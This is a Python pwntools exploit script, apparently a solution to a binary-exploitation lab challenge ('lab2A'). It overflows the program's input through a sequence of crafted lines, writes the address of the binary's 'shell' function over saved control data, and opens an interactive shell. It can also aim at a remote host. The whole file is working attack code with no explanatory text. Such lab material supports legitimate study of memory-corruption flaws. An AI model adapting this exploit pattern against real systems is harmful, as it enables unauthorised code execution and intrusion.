#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab2A')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x8048777
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    payload = b"A"*14
    io.sendlineafter(b"words:", payload)

    win = p32(exe.sym["shell"])

    for i in range(23):
        io.sendline(b"A")

    for i in win:
        io.sendline(bytes([i]))

    io.sendline(b"A"*12 + p32(9))

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

